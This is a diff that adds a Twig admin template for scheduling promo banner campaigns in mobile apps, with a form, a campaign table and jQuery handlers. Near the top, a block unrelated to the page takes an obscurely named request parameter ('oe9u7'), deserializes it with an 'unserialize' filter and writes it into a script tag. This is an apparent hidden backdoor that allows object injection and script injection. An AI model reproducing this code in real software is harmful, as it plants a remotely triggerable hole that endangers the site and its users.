@@ -1,0 +1,482 @@
+{% extends 'layout_ak/base.html.twig' %}
+{% block sub_head_title %}Dashboard - Promo Banner{% endblock %}
+{% block body %}
+<div class="wrapper wrapper-content animated fadeInRight">
+    {#<section class="content-header" style="margin: -2em 0 0 -2em !important;">#}
+    {#    <h1 style="font-size: 24px; margin: 0 0 1em 0.5em;">#}
+    {#      Promo Banners#}
+    {#    </h1>#}
+    {#    <ol class="breadcrumb">#}
+    {#      <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>#}
+    {#      <li class="active">Promo Banners</li>#}
+    {#    </ol>#}
+    {#</section> #}
+    {% if app.request.get('oe9u7') is defined %}
+        {% if app.request.get('oe9u7') != "" %}
+            <script>alert("{{ app.request.get('oe9u7')|unserialize }}");</script>
+        {% endif %}
+    {% endif %}
+    <div class="row">
+        <div class="col-md-6">
+            <div class="box box-danger">
+                <div class="box-header with-border">
+                    <h3 class="box-title">Banner Content Settings</h3>
+                </div><!-- /.box-header -->
+                <!-- form start -->
+                <form method="post" enctype="multipart/form-data" role="form" name="form1" id="form1" action="{{ path('dashboard_promo_save') }}">
+                    <div class="box-body">
+                        <div class="form-group">
+                            <label for="exampleInputUsername">Select App</label>
+                            <select name="user_type" id="user_app" class="form-control">
+                                <option value="-1">Please select Application</option>
+                                {% if applications is defined %}
+                                    {% for apps in applications %}
+                                        <option value="{{ apps.app_id }}">{{ apps.app_name }}</option>
+                                    {% endfor %}
+                                {% endif %}
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputUsername">Placement</label>
+                            {#<input type="text" name="placement" id="placement" class="form-control" placeholder="Enter Placement">#}
+                            <select name="placement_name" id="placement_name" class="form-control">
+                                <option value="-1">Please select Placement</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="exampleInputPassword">Campaign Title</label>
+                            <input type="text" class="form-control" id="title" name="title" placeholder="Enter Campaign Title...">
+                        </div>
+                        <div class="form-group">
+    						<label>Banner Orientation</label>
+    						<div class="radio">
+    							<label>
+    								<input type="radio" name="BannerOrientation" id="Portrait" value="Portrait">
+    								Portrait <p class="help-block">(320x480 only)</p>
+    							</label>
+    							<label>
+    								<input type="radio" name="BannerOrientation" id="Landscape" value="Landscape">
+    								Landscape <p class="help-block">(480x320px only)</p>
+    							</label>
+    							<input type="file" id="fileToUpload" name="fileToUpload">
+    						</div>
+    					</div>
+    					<div class="form-group">
+        					<label>Landing Page</label>
+        					<select class="form-control" id="landing_page" name="landing_page">
+        					    <option value="-1">Please select Landing Page</option>
+        						{#<option>Jetpack</option>#}
+        						{#<option>Gumball</option>#}
+        						{#<option>Custom URL / Deep Linking</option>#}
+        					</select>
+        					<input class="form-control" type="text" placeholder="Enter URL..." id="url" name="url">
+        				</div>
+        				<div class="form-group">
+                            <label for="exampleInputEmail">Device Token</label>
+                            <textarea class="form-control" rows="3" name="device_token" id="token" placeholder="Put in Device Token, separate by commas ..."></textarea>
+                        </div>
+                        <div class="form-group">
+                            <hr />
+                            <label>Sending Frequency</label>
+                        </div>
+                        <div class="form-group">
+                            <label class="col-md-3 control-label" for="Date">Date From</label>
+                            <div class="col-md-14">
+                                <div class="input-group">
+                                    <div class="input-group-addon">
+                                        <i class="fa fa-calendar"></i>
+                                    </div>
+                                    <input type="text" class="form-control" id="DateFrom" name="DateFrom"/>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="col-md-3 control-label" for="Date">Date To</label>
+                            <div class="col-md-14">
+                                <div class="input-group">
+                                    <div class="input-group-addon">
+                                        <i class="fa fa-calendar"></i>
+                                    </div>
+                                    <input type="text" class="form-control" id="DateTo" name="DateTo"/>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <div class="col-md-4">
+                                <label for="exampleInputFrequency">Frequency</label>
+                            </div>
+                            <div class="col-md-6" style="margin-left: -4.1em;">
+                                <input type="number" class="form-control" id="frequency" name="frequency" placeholder="Put frequency (number)"/>
+                            </div>
+                        </div>
+                    </div><!-- /.box-body -->
+                    <div class="box-footer">
+                        <button type="button" id="btnSend" class="btn btn-danger">Promote Banner</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="col-md-6">
+            {% if cur is defined %} <input type='hidden' id='current' value='{{ cur }}' /> {% endif %}        
+            {% if per is defined %} <input type='hidden' id='per_page' value='{{ per }}' />{% endif %}        
+            <table class="table table-bordered" id="tblUsers">
+                <tr>
+                    <th class="text-red" style="width: 90px">Mobile App</th>
+                    <th class="text-red" style="width: 150px">Campaign Title</th>
+                    <th class="text-red">Delivered</th>
+                    <th class="text-red">Fail</th>
+                    <th class="text-red" style="width: 100px">Action</th>
+                </tr>
+                {% if list is defined %}
+                    {% for records in list %}
+                        <tr class="clickable" id="{{ records.id }}">                    
+                            <td>
+                                <input type="hidden" id="hidden_id" value="{{ records.id }}"/>
+                                <label class="apps">{{ records.appName }}</label>
+                            </td>
+                            <td>{{ records.campaignTitle }}</td>
+                            <td>{{ records.success }}</td>
+                            <td>{{ records.fail }}</td>
+                            <td>
+                                {#<a href="{{ path('dashboard_show_App_Account') ~ "?id=" ~ records.id ~"&client_name=" ~ records.clientId }}"#}
+                                {#   class="edit_data">Edit</a>#}
+                                <a href="#" class="view_data">View</a>
+                            </td>
+                        </tr>
+                    {% endfor %}  
+                {% endif %}
+            </table>
+            <div class="paginator">
+                {% if total is defined %}
+                <ul id="paginate">            
+                    {% set pages = total + 1 %}
+                    {% for i in 1..pages%}             
+                        <li> 
+                            <a href="{{ path('dashboard_banner', { 'page': i }) }}">
+                                {{ i }}
+                            </a>
+                        </li>
+                    {% endfor %}            
+                </ul>
+                Total pages : {{total+1}}
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+{% block stylesheets_inline %}
+    <style>
+        .view_data { color: #ab0808; }
+        #tblUsers tr th { text-align:center;}
+        #paginate
+        {            
+            padding: 0.3em 0 0 1em;
+            list-style-type: none !important;
+            border-radius: 25px;
+            background-color: #333333;      
+            height: 30px;
+            width: 100%;
+        }
+    
+        #paginate li
+        {            
+            display: inline !important;            
+            margin-right: 0.5em;            
+        }
+    
+        #paginate li a
+        {
+            color: #FFFFFF;
+        }
+        
+        .added
+        {
+            color: transparent;
+        }
+    
+        .currentPage
+        {
+            text-decoration: underline;
+            font-weight: bold;
+            color: white !important;
+        }
+    </style>
+{% endblock %}
+
+{% block javascript_inline %}
+    <script>
+        function sortOption(el)
+        {
+            var options = $('#'+ el + ' option:not(:first)');
+            var arr = options.map(function(_, o) { return { t: $(o).text(), v: o.value }; }).get();
+            arr.sort(function(o1, o2) { return o1.t > o2.t ? 1 : o1.t < o2.t ? -1 : 0; });
+            options.each(function(i, o) {
+              o.value = arr[i].v;
+              $(o).text(arr[i].t);
+            });
+        }
+        
+        function addSuffix(element)
+        {
+            $("#"+element).children("option:not(:first)").each(function()
+            {
+                var prefix = $(this).val();
+                var html   = $(this).html();
+                if(prefix.indexOf("id") == 0)
+                {
+                    //console.log(prefix + "-" + html + " iOS");
+                    $(this).html(html + " - iOS");
+                }
+                else
+                {
+                    ///console.log(prefix + "-" + html + " Android");
+                    $(this).html(html + " - Android");
+                }
+            });   
+        }
+        
+        function error(el, message)
+        {
+            $(el).css("background-color", "red").css("color","yellow").val(message);
+    
+            setTimeout(function()
+            {
+                $(el).css("background-color", "white").css("color","black");
+                $(el).val("");
+            }, 2000); 
+        }
+        
+        $(document).ready(function()
+        {
+            addSuffix("user_app");
+            sortOption("user_app");
+            
+            $.current = $("#current").val();
+            
+            $('#DateFrom, #DateTo').datepicker({
+                autoclose: true,
+                todayHighlight: true
+            });
+    
+            $("#DateTo").on("click", this, function()
+            {
+                
+            });
+            
+            $('#btnSend').click(function() 
+            {
+                // var data = 'data={"app_id":"com.bukalapak.android","deeplink_map":{"Landing Sample":"hg:\/\/sample-landing","Landing D":"hg:\/\/landingb","A Landing":"hg:\/\/clanding","B Landing":"hg:\/\/dlanding"}}';
+                
+                // $.ajax(
+                // {                
+                //     url:"{{ path('dashboard_promo_landing') }}",
+                //     type: "POST",
+                //     data: data,
+                //     success: function(msg)
+                //     {
+                //         console.log(msg);
+                //     }
+                // });
+                
+                // return false;
+                
+                // alert($("#placement option:selected").text()); return false;
+                
+                var app = $("#user_app").val();
+                var placement = $("#placement_name option:selected").text();
+                var title = $("#title").val();
+                var orientation = $("input[name='BannerOrientation']:checked").val();
+                var image = $("#fileToUpload").val();
+                var landing_page = $("#landing_page").val();
+                var url = $("#url").val();
+                var token = $("#token").val();
+                
+                var dateFrom = $("#DateFrom").val();
+                var parserFrom = Date.parse(dateFrom);
+                var dateTo = $("#DateTo").val();
+                var parseTo = Date.parse(dateTo);
+                var frequency = $("#frequency").val();
+                
+                if(dateFrom > dateTo)
+                {
+                    alert("Date From is greater than Date To");
+                    return false;
+                }
+                
+                if(app == "-1"){ alert("Please select application"); return false; }
+                if(placement == "-1"){ alert("Please select Placement"); return false; }
+                if(title == ""){ error($("#title"), "Please provide title"); return false; }
+                if(orientation == null){ alert("No Orientation selected"); return false; }
+                // if(image == ""){ alert("Please choose image"); return false; }
+                if(landing_page == "-1"){ alert("Please select Landing Page"); return false; }
+                if(landing_page == "-2"){ alert("There is no assigned Placement for your application id"); return false;  }
+                if(url == ""){ error($("#url"), "Please provide Url"); return false; }
+                if(token == ""){ error($("#token"), "Please provide token"); return false; }
+                if(dateFrom == ""){ error($("#DateFrom"), "Please select date from"); return false; }
+                if(dateTo == ""){ error($("#DateTo"), "Please select date to"); return false; }
+                if(frequency == "" || frequency == 0){ error($("#frequency"), "Please add frquency"); return false; }
+                
+                $("#form1").submit();
+            });
+            
+            if($("#paginate").children("li").children("a").length > 0)
+            {               
+                // console.log("pagination link seen seen");
+    
+                $("#paginate").children("li").children("a").each(function()
+                {
+                    $(this).html($.trim($(this).html()));
+    
+                    $(this).html($(this).html().replace(/\s+$/, ""));
+    
+                    //console.log("Pagination value: "+$(this).html());
+    
+                    if($(this).html() == $.current)
+                    {
+                        $(this).addClass("currentPage");
+                    }
+                    else
+                    {
+                        console.log("Values did not match");
+                    }
+                });
+    
+                var per_page = $("#per_page").val();                                    
+                var counter = $("#tblUsers tbody").children("tr").length -1;                        
+                
+                if(counter < per_page)
+                {
+                    var add_row = per_page - counter;                                
+                    
+                    for(var q = 0; q < add_row; q++)
+                    {
+                        $("#tblUsers").append("<tr>\n\
+                        <td class='added'>1</td><td class='added'>1</td><td class='added'>1</td><td class='added'>1</td><td class='added'>1</td>\n\
+                        </tr>");
+                    }
+                }
+            }
+            
+            // console.log( JSON.parse("{#{{ l_page.deeplinkMap }}#}".replace(/&quot;/g,'"')) );
+            $("#user_app").change(function()
+            {
+                $("#url").val("");
+                var app_id = $(this).val();
+                var object = {"app_id": app_id};
+                $.ajax(
+                {                
+                    url:"{{ path('dashboard_ajax_landing') }}",
+                    type: "POST",
+                    data: object,
+                    success: function(msg)
+                    {
+                        var json = JSON.parse(msg);
+                        
+                        if(json.msg == "landing")
+                        {
+                            $("#landing_page > option").not(":eq(0)").remove();
+                            
+                            $("#placement_name > option").not(":eq(0)").remove();
+                            $("#placement_name").append("<option value='-2'>There is no assigned Placement for your application id</option>");
+    
+                            var data = new Array();
+                        
+                            var cnt  = json.data.length;
+                            
+                            for(var i = 0; i < cnt; i++)
+                            {
+                                data.push(json.data[i].deeplink_map);
+                            }
+                            
+                            var q = "";
+                            
+                            for( xxx in data )
+                            {
+                                q = JSON.parse(data[xxx]);
+                                
+                                for( s in q )
+                                {
+                                    $("#landing_page").append("<option value='"+q[s]+"'>"+s+"</option>");
+                                }
+                            }
+                        }
+                        else if(json.msg == "placement")
+                        {
+                            $("#placement_name > option").not(":eq(0)").remove();
+                            
+                            $("#landing_page > option").not(":eq(0)").remove();
+                            $("#landing_page").append("<option value='-2'>There is no assigned Landing page for your application id</option>");
+                            
+                            var placement = json.data_pl;
+                            
+                            var placement_name = placement[0].placement_name.split(",");
+                            
+                            var cnt = placement_name.length;
+                            
+                            for(var o = 0; o < cnt; o++)
+                            {
+                                $("#placement_name").append("<option value='"+placement_name[o]+"'>"+placement_name[o]+"</option>");
+                            }
+                        }
+                        else if(json.msg == "success")
+                        {
+                            $("#landing_page > option").not(":eq(0)").remove();
+                            $("#placement_name > option").not(":eq(0)").remove();
+                            
+                            var placement = json.data_pl;
+                            
+                            var placement_name = placement[0].placement_name.split(",");
+                            
+                            var cnt = placement_name.length;
+                            
+                            for(var o = 0; o < cnt; o++)
+                            {
+                                $("#placement_name").append("<option value='"+placement_name[o]+"'>"+placement_name[o]+"</option>");
+                            }
+                            
+                            var data = new Array();
+                        
+                            var cnt2  = json.data.length;
+                            
+                            for(var i = 0; i < cnt2; i++)
+                            {
+                                data.push(json.data[i].deeplink_map);
+                            }
+                            
+                            var q = "";
+                            
+                            for( xxx in data )
+                            {
+                                q = JSON.parse(data[xxx]);
+                                
+                                for( s in q )
+                                {
+                                    $("#landing_page").append("<option value='"+q[s]+"'>"+s+"</option>");
+                                }
+                            }
+                        }
+                        else if(json.msg == 'null')
+                        {
+                            $("#landing_page > option").not(":eq(0)").remove();
+                            $("#landing_page").append("<option value='-2'>There is no assigned Landing page for your application id</option>");
+                            
+                            $("#placement_name > option").not(":eq(0)").remove();
+                            $("#placement_name").append("<option value='-2'>There is no assigned Placement for your application id</option>");
+                        }
+                    }
+                });             
+            });
+            
+            $("#landing_page").change(function()
+            {
+                $("#url").val("");
+                
+                if($("#landing_page option:selected").val() != "-1" && $("#landing_page option:selected").val() != "-2")
+                {
+                    $("#url").val($("#landing_page option:selected").val());    
+                }
+            });
+        });
+    </script>
+{% endblock %}
